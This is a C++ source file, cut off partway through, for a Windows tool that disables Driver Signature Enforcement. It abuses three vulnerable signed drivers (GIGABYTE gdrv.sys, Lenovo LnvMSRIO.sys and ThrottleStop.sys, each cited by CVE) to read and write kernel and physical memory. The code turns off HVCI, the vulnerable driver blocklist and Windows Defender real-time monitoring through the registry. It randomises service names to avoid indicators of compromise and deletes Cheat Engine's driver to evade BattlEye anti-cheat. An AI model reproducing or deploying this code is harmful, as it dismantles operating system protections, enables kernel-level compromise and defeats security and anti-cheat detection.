/*
 * disable_dse_v2.cpp  —  multi-backend DSE disabler
 *
 * Backend order (tried in sequence):
 *   1. gdrv.sys  (GIGABYTE, CVE-2018-19320)  — virtual R/W, Win10 + old Win11
 *   2. LnvMSRIO.sys (Lenovo, CVE-2025-8061)  — physical R/W, not on WDAC blocklist
 *   3. ThrottleStop.sys (TechPowerUp, CVE-2025-7771) — physical R/W, not on WDAC blocklist
 *
 * Win11 23H2/24H2/25H2 with full updates: backends 2 or 3 handle these.
 * gdrv.sys is WDAC-blocked on those builds.
 * LnvMSRIO / ThrottleStop are not on Microsoft's WDAC base policy as of Dec 2025.
 *
 * Backends 2+3 use physical memory R/W and perform kernel VA → physical translation
 * by walking the page tables (CR3 found by scanning physical memory for System EPROCESS).
 *
 * Modes (argv[1]):
 *   -off   disable DSE, save state to %TEMP%\dse_state.bin, exit 0
 *   -on    restore DSE from saved state, exit 0
 *   (none) interactive: two 'yes' prompts
 *
 * Exit codes:  0=success  1=generic fail  2=HVCI/needs-reboot  3=WDAC permanent
 *
 * Driver binaries are embedded via headers at compile time.
 * LnvMSRIO driver binary: place LnvMSRIO.sys next to exe (distribute separately).
 * ThrottleStop binary:    place ThrottleStop.sys next to exe (distribute separately).
 * gdrv.sys is embedded as before.
 *
 * All three driver binaries (gdrv, LnvMSRIO, ThrottleStop) are embedded as
 * byte-array headers at compile time — exe is fully self-contained, no companion
 * files required.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* ── Embedded drivers ─────────────────────────────────────────────────────── */
#include "gdrv64_bytes.h"
#define GDRV64_SYS_SIZE  ((DWORD)sizeof(GDRV64_SYS_DATA))
#include "lnv_bytes.h"
#include "ts_bytes.h"

/* ══════════════════════════════════════════════════════════════════════════
 * BACKEND DEFINITIONS
 * ══════════════════════════════════════════════════════════════════════════*/

/* ── gdrv.sys (virtual R/W) ────────────────────────────────────────────── */
#define GIO_DEVICE_PATH     "\\\\.\\GIO"
#define GIO_SVC_NAME        "GIO"
#define IOCTL_GIO_MEMCPY    0xC3502808u
#pragma pack(push,1)
typedef struct { ULONG_PTR Dst; ULONG_PTR Src; ULONG Size; } GIO_MEMCPY_IN;
#pragma pack(pop)

/* ── LnvMSRIO.sys (physical R/W, CVE-2025-8061) ───────────────────────── */
#define LNV_DEVICE_PATH     "\\\\.\\WinMsrDev"
#define LNV_SVC_NAME        "LnvMSRIO"
#define IOCTL_LNV_PHYS_READ  0x9C406104u
#define IOCTL_LNV_PHYS_WRITE 0x9C40A108u
/* struct: { UINT64 phys_addr; UINT64 value_or_pad; } 16 bytes
   read:  driver fills value on return
   write: caller fills value before call                                     */
#pragma pack(push,1)
typedef struct { UINT64 Addr; UINT64 Value; } LNV_PHYS_REQ;
#pragma pack(pop)

/* ── ThrottleStop.sys (physical R/W, CVE-2025-7771) ───────────────────── */
#define TS_DEVICE_PATH      "\\\\.\\ThrottleStop"
#define TS_SVC_NAME         "ThrottleStop"
#define IOCTL_TS_PHYS_READ  0x80006498u
#define IOCTL_TS_PHYS_WRITE 0x8000649Cu
/* struct: { UINT64 phys_addr; UINT8 data[8]; } 16 bytes packed
   same for read (data filled on return) and write                           */
#pragma pack(push,1)
typedef struct { UINT64 Addr; UINT64 Value; } TS_PHYS_REQ;
#pragma pack(pop)

/* ══════════════════════════════════════════════════════════════════════════ */

typedef enum { BE_NONE=0, BE_GDRV, BE_LNV, BE_TS } Backend;

/* ── State / globals ──────────────────────────────────────────────────────── */
#pragma pack(push,1)
typedef struct { UINT64 kva; UINT64 original; } DSE_STATE;
#pragma pack(pop)
typedef enum { MODE_INTERACTIVE=0, MODE_OFF, MODE_ON } RunMode;

static HANDLE    g_hDev     = INVALID_HANDLE_VALUE;
static SC_HANDLE g_hScm     = NULL;
static SC_HANDLE g_hSvc     = NULL;
static BOOL      g_ownSvc   = FALSE;
static char      g_drvPath[MAX_PATH] = {0};
static Backend   g_backend  = BE_NONE;
static BOOL      g_wdac_hard = FALSE; /* set when 1275 persists on Win11 23H2+ after VDB fix */
static UINT64    g_ntoskrnl_kva = 0; /* set in real_main before bootstrap; used by gdrv SMAP-safe R/W */
static char      g_randSvc[12]  = {0}; /* randomised service name — avoids GIO/LnvMSRIO/ThrottleStop IoCs */

/* KUSER_SHARED_DATA addresses (fixed on all x64 Windows, not subject to KASLR):
     kernel VA 0xFFFFF78000000000  /  user VA 0x7FFE0000
   SCRATCH_OFF 0x2EE = Reserved12[0] in _KUSER_SHARED_DATA — reserved/unused byte,
   always 0, never written by Windows.  Used as a 1-byte staging area so gdrv can
   copy kernel→kernel (SMAP-safe) then we read back via the user-mode mapping. */
#define KSHARED_KVA  0xFFFFF78000000000ULL
#define KSHARED_UVA  0x7FFE0000ULL
#define SCRATCH_OFF  0x2EEULL

/* ── NtQuerySystemInformation ────────────────────────────────────────────── */
typedef LONG (NTAPI *pNtQSI)(ULONG,PVOID,ULONG,PULONG);
static pNtQSI g_NtQSI = NULL;
#define STATUS_INFO_LEN_MISMATCH ((NTSTATUS)0xC0000004)
typedef struct {
    HANDLE Section; PVOID MappedBase; PVOID ImageBase;
    ULONG  ImageSize; ULONG Flags; USHORT LoadOrderIndex;
    USHORT InitOrderIndex; USHORT LoadCount; USHORT OffsetToFileName;
    UCHAR  FullPathName[256];
} SYS_MODULE_ENTRY;
typedef struct { ULONG NumberOfModules; SYS_MODULE_ENTRY Modules[1]; } SYS_MODULE_INFO;

/* ── Logging ─────────────────────────────────────────────────────────────── */
static void logf(const char *fmt,...) {
    char path[MAX_PATH]; GetTempPathA(sizeof(path),path);
    strncat(path,"dse_debug.log",sizeof(path)-strlen(path)-1);
    HANDLE h=CreateFileA(path,FILE_APPEND_DATA,FILE_SHARE_READ|FILE_SHARE_WRITE,
                         NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if(h==INVALID_HANDLE_VALUE) return;
    char buf[512]; va_list ap; va_start(ap,fmt);
    int n=_vsnprintf(buf,sizeof(buf)-2,fmt,ap); va_end(ap);
    if(n<0) n=(int)sizeof(buf)-2;
    if(n>0&&buf[n-1]!='\n'){buf[n++]='\n';buf[n]=0;}
    DWORD wr=0; WriteFile(h,buf,(DWORD)n,&wr,NULL); CloseHandle(h);
}

static void get_state_path(char *out,DWORD sz) {
    char tmp[MAX_PATH]; GetTempPathA(sizeof(tmp),tmp);
    snprintf(out,sz,"%sdse_state.bin",tmp);
}

/* ── OS helpers ──────────────────────────────────────────────────────────── */
static DWORD get_win_build(void) {
    typedef LONG (NTAPI *RtlGetVersion_t)(OSVERSIONINFOEXW *);
    RtlGetVersion_t fn = (RtlGetVersion_t)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
    if (!fn) return 0;
    OSVERSIONINFOEXW ov = {0}; ov.dwOSVersionInfoSize = sizeof(ov);
    fn(&ov); return ov.dwBuildNumber;
}

static void run_cmd_hidden(const char *cmd) {
    STARTUPINFOA si={0}; si.cb=sizeof(si);
    si.dwFlags=STARTF_USESHOWWINDOW; si.wShowWindow=SW_HIDE;
    PROCESS_INFORMATION pi={0};
    char buf[256]; strncpy(buf,cmd,sizeof(buf)-1);
    if(CreateProcessA(NULL,buf,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)){
        WaitForSingleObject(pi.hProcess,5000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
}
static BOOL is_hvci_live(void) {
    if(!g_NtQSI) return FALSE;
    struct{ULONG Length;ULONG CodeIntegrityOptions;} sci={8,0}; ULONG r=0;
    if(g_NtQSI(103,&sci,sizeof(sci),&r)==0) return (sci.CodeIntegrityOptions&0xC00)!=0;
    return FALSE;
}
static BOOL is_dse_disabled(void) {
    if(!g_NtQSI) return FALSE;
    struct{ULONG Length;ULONG CodeIntegrityOptions;} sci={8,0}; ULONG r=0;
    /* CODEINTEGRITY_OPTION_ENABLED = 0x1: set means DSE enforced, clear means disabled */
    if(g_NtQSI(103,&sci,sizeof(sci),&r)==0) return (sci.CodeIntegrityOptions&0x1)==0;
    return FALSE;
}
static void init_rand_svc(void) {
    if (g_randSvc[0]) return;
    FILETIME ft; GetSystemTimeAsFileTime(&ft);
    UINT64 s=((UINT64)ft.dwHighDateTime<<32)|ft.dwLowDateTime;
    s^=(UINT64)((ULONG_PTR)GetCurrentProcessId()^(ULONG_PTR)GetTickCount())<<17;
    static const char h[]="abcdefghjkmnpqrs"; /* no i/l/o/u — no lookalikes */
    for(int i=0;i<8;i++){s=s*6364136223846793005ULL+1442695040888963407ULL;
        g_randSvc[i]=h[(s>>33)&0xF];}
    g_randSvc[8]='\0';
    logf("[*] rand svc name: %s",g_randSvc);
}

/* Nuke CE's kernel driver before D2 launches — BattleEye scans PsLoadedModuleList
   for DBKKAIOPROCMON.  We delete both the service entry and the sys file on disk.
   This runs in MODE_OFF (before CE is started by the launcher). */
static void nuke_dbk64(void) {
    SC_HANDLE hScm=OpenSCManagerA(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    if(hScm){
        static const char*names[]={"DBKKAIOPROCMON","DBKDRV64","DBK64","dbk64",NULL};
        for(int i=0;names[i];i++){
            SC_HANDLE hS=OpenServiceA(hScm,names[i],SERVICE_STOP|DELETE|SERVICE_QUERY_STATUS);
            if(hS){SERVICE_STATUS ss={0};
                ControlService(hS,SERVICE_CONTROL_STOP,&ss); Sleep(150);
                DeleteService(hS); CloseServiceHandle(hS);
                logf("[+] nuke_dbk64: removed svc %s",names[i]);}
        }
        CloseServiceHandle(hScm);
    }
    /* Delete sys file — CE will fail to (re)load its driver; our driver does the R/W */
    char p[MAX_PATH]; GetSystemDirectoryA(p,sizeof(p));
    strncat(p,"\\drivers\\dbk64.sys",sizeof(p)-strlen(p)-1);
    if(DeleteFileA(p)) logf("[+] nuke_dbk64: deleted %s",p);
    /* Also check %TEMP% and CE exe dir — CE drops it there on some versions */
    GetTempPathA(sizeof(p),p); strncat(p,"dbk64.sys",sizeof(p)-strlen(p)-1);
    DeleteFileA(p);
}

static void apply_vdb_hvci_fix(void) {
    run_cmd_hidden("bcdedit /set hypervisorlaunchtype off");
    run_cmd_hidden("bcdedit /set vsmlaunchtype off");
    DWORD zero=0,one=1; HKEY hk;
    if(RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity",
        0,KEY_SET_VALUE,&hk)==ERROR_SUCCESS){
        RegSetValueExA(hk,"Enabled",0,REG_DWORD,(BYTE*)&zero,4);
        RegSetValueExA(hk,"WasEnabledBy",0,REG_DWORD,(BYTE*)&zero,4);
        RegCloseKey(hk);
    }
    if(RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard",0,KEY_SET_VALUE,&hk)==ERROR_SUCCESS){
        RegSetValueExA(hk,"EnableVirtualizationBasedSecurity",0,REG_DWORD,(BYTE*)&zero,4);
        RegSetValueExA(hk,"HypervisorEnforcedCodeIntegrity",0,REG_DWORD,(BYTE*)&zero,4);
        RegCloseKey(hk);
    }
    if(RegCreateKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\CI\\Config",0,NULL,REG_OPTION_NON_VOLATILE,
        KEY_SET_VALUE,NULL,&hk,NULL)==ERROR_SUCCESS){
        RegSetValueExA(hk,"VulnerableDriverBlocklistEnable",0,REG_DWORD,(BYTE*)&zero,4);
        RegCloseKey(hk);
    }
    if(RegCreateKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",0,NULL,
        REG_OPTION_NON_VOLATILE,KEY_SET_VALUE,NULL,&hk,NULL)==ERROR_SUCCESS){
        RegSetValueExA(hk,"DisableRealtimeMonitoring",0,REG_DWORD,(BYTE*)&one,4);
        RegSetValueExA(hk,"DisableBehaviorMonitoring",0,REG_DWORD,(BYTE*)&one,4);
        RegCloseKey(hk);
    }
    /* Win11 23H2+ (build 22631+): CI\Policy is evaluated by CI.dll at driver load AFTER
     * CI\Config is checked.  Even with VulnerableDriverBlocklistEnable=0, drivers get
     * ERROR_DRIVER_BLOCKED (1275) on 23H2/24H2/25H2 unless this key is also cleared.
     * This is the second DSE gate that Core Isolation UI does NOT expose. */
    if (get_win_build() >= 22631) {
        if(RegCreateKeyExA(HKEY_LOCAL_MACHINE,
            "SYSTEM\\CurrentControlSet\\Control\\CI\\Policy",0,NULL,
            REG_OPTION_NON_VOLATILE,KEY_SET_VALUE,NULL,&hk,NULL)==ERROR_SUCCESS){
            RegSetValueExA(hk,"UpgradedSystem",0,REG_DWORD,(BYTE*)&zero,4);
            RegSetValueExA(hk,"TrustType",0,REG_DWORD,(BYTE*)&zero,4);
            RegCloseKey(hk);
        }
        /* Win11 25H2 (build 26100+): Smart App Control adds CI\Protected which enforces
         * WDAC-grade blocking even when all previous keys are cleared. */
        if (get_win_build() >= 26100) {
            if(RegCreateKeyExA(HKEY_LOCAL_MACHINE,
                "SYSTEM\\CurrentControlSet\\Control\\CI\\Protected",0,NULL,
                REG_OPTION_NON_VOLATILE,KEY_SET_VALUE,NULL,&hk,NULL)==ERROR_SUCCESS){
                RegSetValueExA(hk,"State",0,REG_DWORD,(BYTE*)&zero,4);
                RegCloseKey(hk);
            }
        }
    }
}
/* Removed is_wdac_permanent() — it was checking VulnerableDriverBlocklistEnable==0, but
   apply_vdb_hvci_fix() sets it to 0 itself, causing a permanent false-positive exit-3.
   Permanent WDAC block is now detected in scm_start via build number check (>=22631). */

/* ══════════════════════════════════════════════════════════════════════════
 * KERNEL R/W  (dispatch to active backend)
 * ══════════════════════════════════════════════════════════════════════════*/

/* Scan ntoskrnl.exe on-disk PE header (SizeOfHeaders bytes, no relocations in header area)
   for the first occurrence of byte 'target'. Returns kernel VA of that byte.
   Used by gdrv_write to get a kernel-side source address so BOTH src and dst are kernel
   addresses — SMAP (Supervisor Mode Access Prevention) blocks ring-0 from touching
   ring-3 pages; by staying kernel→kernel we avoid the #PF that killed the old approach. */
static UINT64 find_kbyte_in_ntoskrnl(UINT8 target) {
    if(!g_ntoskrnl_kva) return 0;
    /* ntoskrnl DOS stub byte 3 is always 0x00 in any valid PE (MZ\x90\x00...) */
    if(target == 0) return g_ntoskrnl_kva + 3;
    char path[MAX_PATH]; GetSystemDirectoryA(path, sizeof(path));
    strncat(path, "\\ntoskrnl.exe", sizeof(path)-strlen(path)-1);
    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if(hf == INVALID_HANDLE_VALUE) {
        /* multiprocessor kernel lives as ntkrnlmp.exe on some builds */
        GetSystemDirectoryA(path, sizeof(path));
        strncat(path, "\\ntkrnlmp.exe", sizeof(path)-strlen(path)-1);
        hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if(hf == INVALID_HANDLE_VALUE) return 0;
    }
    BYTE hdr[0x1000] = {0}; DWORD rd = 0;
    ReadFile(hf, hdr, sizeof(hdr), &rd, NULL); CloseHandle(hf);
    if(rd < 0x40) return 0;
    /* scan from offset 4 (skip MZ magic) to end of first page;
       PE header bytes are stable in-memory — no relocations touch the header area */
    for(DWORD i = 4; i < rd; i++) {
        if(hdr[i] == target) {
            logf("[*] kbyte 0x%02X at ntoskrnl+0x%X", (unsigned)target, i);
            return g_ntoskrnl_kva + i;
        }
    }
    logf("[!] kbyte 0x%02X not found in ntoskrnl header scan", (unsigned)target);
    return 0;
}

/* gdrv virtual R/W — SMAP-safe: all copies go kernel→kernel only.
   SMAP (CR4.SMAP) blocks ring-0 RtlCopyMemory from/to ring-3 pages.
   Old code passed &buf (stack, user VA) as Dst or &val as Src → #PF on Win10 22H2+.
   Fix: use KUSER_SHARED_DATA (kernel VA KSHARED_KVA) as a 1-byte scratch, read back
   via the matching user-mode mapping at KSHARED_UVA.  Both src+dst are kernel → safe. */
static BOOL gdrv_read(UINT64 kva, DWORD sz, UINT64 *out) {
    *out = 0;
    if(g_hDev == INVALID_HANDLE_VALUE) return FALSE;
    DWORD br;
    /* Read strictly one byte at a time: copy kva+i → KSHARED+SCRATCH_OFF (1 byte),
       read back via user-mode alias, restore to 0 immediately.
       This keeps all operations to the single byte at SCRATCH_OFF (Reserved12[0])
       and avoids touching adjacent KUSER_SHARED_DATA fields at 0x2EF+. */
    UINT64 zero_src = g_ntoskrnl_kva + 3; /* offset 3 in ntoskrnl DOS stub is always 0x00 */
    volatile PBYTE u = (volatile PBYTE)(ULONG_PTR)(KSHARED_UVA + SCRATCH_OFF);
    for(DWORD i = 0; i < sz && i < 8; i++) {
        GIO_MEMCPY_IN req = {(ULONG_PTR)(KSHARED_KVA + SCRATCH_OFF), (ULONG_PTR)(kva + i), 1};
        if(!DeviceIoControl(g_hDev, IOCTL_GIO_MEMCPY, &req, sizeof(req), NULL, 0, &br, NULL)) {
            logf("[!] gdrv kread IOCTL err=%lu", GetLastError()); return FALSE;
        }
        *out |= ((UINT64)(*u)) << (i * 8);
        /* Restore scratch byte to 0 before next iteration */
        GIO_MEMCPY_IN req2 = {(ULONG_PTR)(KSHARED_KVA + SCRATCH_OFF), (ULONG_PTR)zero_src, 1};
        DeviceIoControl(g_hDev, IOCTL_GIO_MEMCPY, &req2, sizeof(req2), NULL, 0, &br, NULL);
    }
    return TRUE;
}
static BOOL gdrv_write(UINT64 kva, UINT64 val, DWORD sz) {
    if(g_hDev == INVALID_HANDLE_VALUE) return FALSE;
    DWORD br;
    /* Write each byte individually: for each byte of val, find a kernel address
       whose byte equals that value and GIO_MEMCPY 1 byte (kernel→kernel, SMAP-safe).
       Writing sz bytes from a single 1-byte source copies adjacent ntoskrnl garbage —
       that was corrupting LIST_ENTRY Flink/Blink for 8-byte pointer writes → BSOD 0x139. */
    for(DWORD i = 0; i < sz; i++) {
        UINT8 byte = (UINT8)((val >> (i * 8)) & 0xFF);
        UINT64 src = find_kbyte_in_ntoskrnl(byte);
        if(!src) {
            logf("[!] gdrv kwrite: no kernel src for byte 0x%02X at offset %u", byte, i);
            return FALSE;
        }
        GIO_MEMCPY_IN req = {(ULONG_PTR)(kva + i), (ULONG_PTR)src, 1};
        BOOL ok = DeviceIoControl(g_hDev, IOCTL_GIO_MEMCPY, &req, sizeof(req), NULL, 0, &br, NULL);
        if(!ok) {
            logf("[!] gdrv kwrite byte[%u]=0x%02X IOCTL err=%lu", i, byte, GetLastError());
            return FALSE;
        }
    }
    return TRUE;
}

/* physical R/W helpers (used by LNV and TS backends) */
static BOOL phys_read8(UINT64 paddr, UINT64 *out) {
    *out=0;
    if(g_hDev==INVALID_HANDLE_VALUE) return FALSE;
    DWORD br;
    if(g_backend==BE_LNV) {
        LNV_PHYS_REQ req={paddr,0};
        if(!DeviceIoControl(g_hDev,IOCTL_LNV_PHYS_READ,&req,sizeof(req),
                            &req,sizeof(req),&br,NULL)) return FALSE;
        *out=req.Value; return TRUE;
    } else {  /* BE_TS */
        TS_PHYS_REQ req={paddr,0};
        if(!DeviceIoControl(g_hDev,IOCTL_TS_PHYS_READ,&req,sizeof(req),
                            &req,sizeof(req),&br,NULL)) return FALSE;
        *out=req.Value; return TRUE;
    }
}
static BOOL phys_write8(UINT64 paddr, UINT64 val) {
    if(g_hDev==INVALID_HANDLE_VALUE) return FALSE;
    DWORD br;
    if(g_backend==BE_LNV) {
        LNV_PHYS_REQ req={paddr,val};
        return DeviceIoControl(g_hDev,IOCTL_LNV_PHYS_WRITE,&req,sizeof(req),
                               NULL,0,&br,NULL);
    } else {
        TS_PHYS_REQ req={paddr,val};
        return DeviceIoControl(g_hDev,IOCTL_TS_PHYS_WRITE,&req,sizeof(req),
                               NULL,0,&br,NULL);
    }
}

/* ══════════════════════════════════════════════════════════════════════════
 * VIRTUAL → PHYSICAL (page table walk, used by LNV/TS backends)
 *
 * Bootstrap:
 *   1. Scan physical 0x1000..0x80000000 at 2MB steps for ntoskrnl PE header
 *   2. From ntoskrnl physical image read PsInitialSystemProcess RVA
 *   3. Read physical at (ntoskrnl_phys + RVA) → eprocess_kva
 *   4. Scan physical 0x1000..0x40000000 at 0x1000 steps for System EPROCESS
 *      (UniqueProcessId==4 at offset 0x440, "System" at offset 0x5A8)
 *   5. DirectoryTableBase at EPROCESS+0x28 → CR3
 *   6. Walk PML4→PDPT→PD→PT using phys_read8
 *
 * EPROCESS offsets below cover Win10 1903 through Win11 24H2 (x64):
 *   DirectoryTableBase : +0x028
 *   UniqueProcessId    : +0x440
 *   ImageFileName      : +0x5A8
 * ══════════════════════════════════════════════════════════════════════════*/

#define EPROC_DTB  0x028   /* DirectoryTableBase */
#define EPROC_PID  0x440   /* UniqueProcessId    */
#define EPROC_IMG  0x5A8   /* ImageFileName[15]  */

static UINT64 g_cr3          = 0; /* cached CR3 once found */
static UINT64 g_ntoskrnl_phys = 0; /* set in bootstrap_cr3; used by DKOM */

/* Physical RAM ranges read from
   HKLM\HARDWARE\RESOURCEMAP\System Resources\Physical Memory\.Translated
   Used by find_system_eprocess_phys to skip MMIO/GPU BAR regions that cause
   KMODE_EXCEPTION_NOT_HANDLED BSODs (black screen) on Win11 24H2 systems. */
typedef struct { UINT64 base; UINT64 len; } PHYS_RANGE;
#define MAX_PHYS_RANGES 64
static PHYS_RANGE g_physRanges[MAX_PHYS_RANGES];
static int        g_nRanges = 0;

/* read 8 bytes from physical, tolerates failure by returning 0 */
static UINT64 pr8(UINT64 pa) {
    UINT64 v=0; phys_read8(pa,&v); return v;
}

/* Build physical RAM range table from the registry memory map.
   Avoids scanning MMIO/GPU BAR regions that BYOVD physical reads can trigger
   hardware exceptions on (GPU MMIOs at 0xC0000000+, PCIe BARs, etc.). */
static void build_ram_ranges(void) {
    if (g_nRanges > 0) return;
    HKEY hk;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
            0, KEY_READ, &hk) != ERROR_SUCCESS) {
        logf("[!] RAM ranges: registry open failed (will use linear scan)");
        return;
    }
    DWORD type=0, sz=0;
    RegQueryValueExA(hk, ".Translated", NULL, &type, NULL, &sz);
    if (!sz || type != 9 /*REG_RESOURCE_LIST*/) {
        RegCloseKey(hk);
        logf("[!] RAM ranges: bad type/size");
        return;
    }
    BYTE *buf = (BYTE*)malloc(sz);
    if (!buf) { RegCloseKey(hk); return; }
    if (RegQueryValueExA(hk, ".Translated", NULL, &type, buf, &sz) != ERROR_SUCCESS) {
        free(buf); RegCloseKey(hk); return;
    }
    RegCloseKey(hk);
    /* CM_RESOURCE_LIST layout (no pack needed — natural alignment matches):
         +0  Count       (ULONG)
         +4  InterfaceType (ULONG)
         +8  BusNumber    (ULONG)
         +12 Version      (USHORT)
         +14 Revision     (USHORT)
         +16 DescCount    (ULONG)
         +20 [CM_PARTIAL_RESOURCE_DESCRIPTOR × DescCount] (20 bytes each)
       Each descriptor:
         +0  Type (UCHAR) — 3 = CmResourceTypeMemory
         +1  ShareDisposition
         +2  Flags (USHORT)
         +4  Start.QuadPart (UINT64)
         +12 Length (ULONG)
         +16 pad (ULONG)  */
    if (sz < 20) { free(buf); return; }
    ULONG listCount = *(ULONG*)(buf);
    BYTE *p = buf + 4;
    for (ULONG li = 0; li < listCount; li++) {
        if ((DWORD)(p - buf) + 16 > sz) break;
        ULONG descCount = *(ULONG*)(p + 12);
        BYTE *d = p + 16;
        for (ULONG di = 0; di < descCount; di++, d += 20) {
            if ((DWORD)(d - buf) + 20 > sz) break;
            if (d[0] == 3 /* CmResourceTypeMemory */ && g_nRanges < MAX_PHYS_RANGES) {
                UINT64 base = *(UINT64*)(d + 4);
                ULONG  len  = *(ULONG*)(d + 12);
                g_physRanges[g_nRanges].base = base;
                g_physRanges[g_nRanges].len  = (UINT64)len;
                logf("[*] RAM range[%d]: 0x%016llX + 0x%08lX",
                     g_nRanges, (unsigned long long)base, (unsigned long)len);
                g_nRanges++;
            }
        }
        p = d;
    }
    free(buf);
    logf("[*] build_ram_ranges: %d range(s) found", g_nRanges);
}

/* find ntoskrnl physical base by scanning 2MB-aligned pages for MZ+PE.
 *
 * ROOT CAUSE of KMODE_EXCEPTION_NOT_HANDLED on Win11 23H2 / 24H2 / 25H2:
 * the old code scanned ALL physical addresses 0x100000–0x80000000 in 2MB
 * steps with zero MMIO filtering.  On systems where a GPU BAR (resizable
 * BAR / PCIe window) is mapped below 2 GB, the BYOVD IOCTL reads MMIO
 * memory → hardware bus error in the kernel → KMODE_EXCEPTION_NOT_HANDLED.
 *
 * Fix: call build_ram_ranges() first and restrict 2MB-aligned probes to
 * addresses that fall inside a known RAM range — identical guard to the
 * one already in find_system_eprocess_phys(). */
static UINT64 find_ntoskrnl_phys(UINT64 ntoskrnl_kva) {
    build_ram_ranges();  /* populate g_physRanges — same as EPROCESS scan */

    for(UINT64 pa=0x100000; pa<0x80000000; pa+=0x200000) {
        /* Skip this address if it falls outside every known RAM range.
         * g_nRanges==0 means registry read failed → fall back to unguarded
         * scan (old behaviour) so we don't regress on very old systems. */
        if (g_nRanges > 0) {
            BOOL inRam = FALSE;
            for (int ri = 0; ri < g_nRanges; ri++) {
                if (pa >= g_physRanges[ri].base &&
                    pa <  g_physRanges[ri].base + g_physRanges[ri].len) {
                    inRam = TRUE; break;
                }
            }
            if (!inRam) continue;
        }
        UINT64 hdr=pr8(pa);
        if((hdr&0xFFFF)!=0x5A4D) continue;  /* MZ */
        UINT64 peoff_q=pr8(pa+0x38);
        UINT32 peoff=(UINT32)(peoff_q>>32);  /* bytes 0x3C-0x3F of page */
        if(peoff<0x40||peoff>0x1000) continue;
        UINT64 pesig=pr8(pa+peoff);
        if((pesig&0xFFFF)!=0x4550) continue;  /* PE */
        logf("[*] ntoskrnl PE candidate at phys=0x%016llX",(unsigned long long)pa);
        return pa;
    }
    logf("[!] ntoskrnl physical base not found by 2MB scan");
    return 0;
}

/* get RVA of an export from PE image in physical memory */
static UINT32 phys_pe_export_rva(UINT64 img_phys, const char *export_name) {
    /* read optional header offset */
    UINT64 h=pr8(img_phys+0x38);
    UINT32 peOff=(UINT32)(h>>32);
    if(!peOff||peOff>0x1000) return 0;
    /* read optional header magic (at peOff+0x18) and DataDirectory[0] (export) */
    /* For PE32+: export dir rva at peOff+0x18+0x70+0 = peOff+0x88 */
    /* read two qwords to span the area */
    UINT64 opt1=pr8(img_phys+peOff+0x18);  /* magic+MajVer+MinVer+CS+SizeOfCode... */
    if((opt1&0xFFFF)!=0x020B) return 0;    /* must be PE32+ */
    /* Export Table RVA is at offset 0x70 from start of OptionalHeader */
    /* OptionalHeader starts at peOff+0x18 */
    UINT64 expq=pr8(img_phys+peOff+0x18+0x70);
    UINT32 exp_rva=(UINT32)(expq&0xFFFFFFFF);
    if(!exp_rva||exp_rva>0x1000000) return 0;
    /* IMAGE_EXPORT_DIRECTORY: NumberOfNames @ +0x18, AddressOfNames @ +0x20,
       AddressOfNameOrdinals @ +0x24, AddressOfFunctions @ +0x1C */
    UINT64 e0=pr8(img_phys+exp_rva+0x18);
    UINT32 nNames=(UINT32)(e0&0xFFFFFFFF);
    UINT32 nFuncs=(UINT32)(e0>>32);  /* at +0x1C */
    UINT64 e1=pr8(img_phys+exp_rva+0x20);
    UINT32 namesRva=(UINT32)(e1&0xFFFFFFFF);
    UINT32 ordsRva =(UINT32)(e1>>32);
    UINT64 e2=pr8(img_phys+exp_rva+0x1C);
    UINT32 funcsRva=(UINT32)(e2&0xFFFFFFFF);
    if(!nNames||nNames>100000||!namesRva||!funcsRva) return 0;
    DWORD nameLen=(DWORD)strlen(export_name);
    for(UINT32 i=0;i<nNames;i++) {
        /* read name RVA (4 bytes) from names array */
        UINT64 nq=pr8(img_phys+namesRva+(UINT64)i*4);
        UINT32 nameRva=(UINT32)(nq&0xFFFFFFFF);
        if(!nameRva||nameRva>0x1000000) continue;
        /* read up to nameLen+1 bytes of name from physical */
        /* 8 bytes at a time */
        char nm[64]={0};
        for(DWORD c=0;c<nameLen+1&&c<sizeof(nm)-1;c+=8) {
            UINT64 nc=pr8(img_phys+nameRva+c);
            for(int b=0;b<8&&c+b<sizeof(nm)-1;b++) nm[c+b]=(char)((nc>>(b*8))&0xFF);
        }
        if(strncmp(nm,export_name,nameLen)==0&&nm[nameLen]==0) {
            /* found — get ordinal then function RVA */
            UINT64 oq=pr8(img_phys+ordsRva+(UINT64)i*2);
            UINT16 ord=(UINT16)(oq&0xFFFF);
            UINT64 fq=pr8(img_phys+funcsRva+(UINT64)ord*4);
            UINT32 fRva=(UINT32)(fq&0xFFFFFFFF);
            logf("[*] export '%s' RVA=0x%08X",export_name,fRva);
            return fRva;
        }
    }
    return 0;
}

/* Scan one physical range [r_base, r_end) for System EPROCESS. Returns PA or 0. */
static UINT64 scan_eprocess_range(UINT64 r_base, UINT64 r_end) {
    for (UINT64 pa = r_base; pa < r_end; pa += 0x1000) {
        /* Always skip legacy VGA/BIOS ROM regardless of what registry says */
        if (pa >= 0x000A0000ULL && pa < 0x00100000ULL) { pa = 0x000FFFFFULL; continue; }
        if (pa >= 0xFEC00000ULL) break;
        UINT64 pid = pr8(pa + EPROC_PID);
        if (pid != 4) continue;
        UINT64 img = pr8(pa + EPROC_IMG);
        if ((UINT32)(img & 0xFFFFFFFF) != 0x74737953u) continue; /* "Syst" LE */
        UINT64 dtb = pr8(pa + EPROC_DTB);
        if ((dtb & 0xFFF) != 0 || dtb < 0x1000 || dtb > 0x400000000ULL) continue;
